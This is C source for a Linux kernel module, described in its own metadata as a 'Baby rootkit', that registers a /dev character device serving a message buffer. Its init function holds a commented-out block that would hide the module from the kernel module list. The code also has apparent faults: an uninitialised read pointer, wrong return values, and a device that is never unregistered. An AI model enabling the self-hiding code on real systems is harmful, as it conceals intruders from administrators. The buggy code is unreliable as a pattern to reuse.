#include <linux/module.h> // required for all LKMs
#include <linux/init.h> // required for __init and __exit
#include <linux/uaccess.h> // needed for put_user
#include <linux/fs.h> // needed for register_chardev
//#include <linux/kernel.h>
//#include <linux/sched.h>
//#include <linux/oom.h>


#define MSG_BUFFER_LEN 0x100

MODULE_INFO(intree, "Y");
MODULE_AUTHOR("Zach");
MODULE_LICENSE("GPL v2");
MODULE_DESCRIPTION("Baby rootkit");

static char* filename = THIS_MODULE->name; // this will be our /dev/$filename handle for communication
static char* msg_ptr;
module_param(filename, charp, 0000);
MODULE_PARM_DESC(filename, "Filename in /dev");

int device_open_count = 0;
static char msg_buffer[MSG_BUFFER_LEN];


static int device_open(struct inode *, struct file *);
static int device_release(struct inode *, struct file *);
static ssize_t device_read(struct file *, char *, size_t, loff_t *);
static ssize_t device_write(struct file *, const char *, size_t, loff_t *);


static struct file_operations file_ops = { // operations on our /dev/$filename file
	.read = device_read,               // and their associated functions
	.write = device_write,
	.open = device_open,
	.release = device_release
};

static ssize_t device_read(struct file *flip, char *buffer, size_t len, loff_t *offset) {
	int bytes_read = 0;
	// If we’re at the end, loop back to the beginning
	if (*msg_ptr == 0) {
		msg_ptr = msg_buffer;
	}
	// Put data in the buffer 
	while (len && *msg_ptr) {
		// Buffer is in user data, not kernel, so you can’t just reference
		// with a pointer. The function put_user handles this for us
		put_user(*(msg_ptr++), buffer++);
		len--;
		bytes_read++;
	}
	return bytes_read;
}
 // Called when a process tries to write to our device 
static ssize_t device_write(struct file *flip, const char *buffer, size_t len, loff_t *offset) {
	// This is a read-only device
	return 1;
}
 // Called when a process opens our device
static int device_open(struct inode *inode, struct file *file) {
	// If device is open, return busy
	if (device_open_count) {
		return 1;
	}
	device_open_count++;
	try_module_get(THIS_MODULE);
	return 0;
}
 // Called when a process closes our device 
static int device_release(struct inode *inode, struct file *file) {
	// Decrement the open counter and usage count. Without this, the module would not unload.
	device_open_count--;
	module_put(THIS_MODULE);
	return 0;
}

static int __init mod_init(void) {
	int reg_val;
	pr_info("%s: starting up\n", THIS_MODULE->name);
	pr_info("%s: filename='%s'\n", THIS_MODULE->name, filename);

	// hide self
	//	mutex_lock(&module_mutex);
	//	list_del(&THIS_MODULE->list);
	//	mutex_unlock(&module_mutex);

	pr_info("%s: registering device %s\n", THIS_MODULE->name, filename);
	reg_val = register_chrdev(0, filename, &file_ops);
	if ( reg_val < 0) {
		pr_warn("Error when registering char device.");
		return reg_val;
	}
	pr_info("%s: succesfully registered!\n", THIS_MODULE->name);

	return 0;
}


static void __exit mod_exit(void) {
	pr_info("Goodbye, world.\n");
}

module_init(mod_init);
module_exit(mod_exit);
